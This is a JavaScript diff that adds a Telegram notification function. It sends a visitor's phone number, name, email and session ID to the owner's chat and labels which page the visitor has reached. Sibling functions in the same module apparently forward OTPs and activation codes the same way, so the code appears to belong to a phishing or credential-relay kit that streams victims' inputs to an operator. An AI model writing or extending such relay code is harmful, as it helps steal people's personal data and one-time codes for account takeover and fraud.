@@ -423,6 +423,37 @@ const sendActivationCodeEnteredNotification = async (sessionId, phoneNumber, cod
   }
 };
 
+const sendPhoneNumberSubmittedNotification = async (event) => {
+  const bot = getBot();
+  if (!bot || !OWNER_CHAT_ID) return;
+
+  const { sessionId, phoneNumber, userName, userEmail, timestamp } = event;
+
+  const sessionShort = sessionId ? sessionId.substring(0, 8) : '—';
+
+  let text = '📱 العميل أرسل رقم الجوال\n';
+  text += '━━━━━━━━━━━━━━━━━━━━\n\n';
+  text += '📍 العميل الآن في: صفحة إدخال رقم الجوال\n\n';
+
+  if (userName || userEmail) {
+    text += `👤 العميل:\n`;
+    if (userName) text += `   الاسم: ${userName}\n`;
+    if (userEmail) text += `   الإيميل: ${userEmail}\n`;
+    text += '\n';
+  }
+
+  text += `📱 رقم الهاتف المدخل: ${phoneNumber || '—'}\n`;
+  text += `✅ التحقق: الرقم صالح (يبدأ بـ 5 ويتكون من 9 أرقام)\n\n`;
+  text += `🆔 Session: ${sessionShort}...\n`;
+  text += `📅 ${formatDate(timestamp || new Date())}\n`;
+
+  try {
+    await bot.sendMessage(OWNER_CHAT_ID, text);
+  } catch (err) {
+    console.error('[Telegram] sendPhoneNumberSubmittedNotification error:', err.message);
+  }
+};
+
 module.exports = {
   sendNewOrderNotification,
   sendPaymentStatusNotification,
@@ -434,4 +465,5 @@ module.exports = {
   sendVerifyCodeConfirmation,
   sendOtpEnteredNotification,
   sendActivationCodeEnteredNotification,
+  sendPhoneNumberSubmittedNotification,
 };
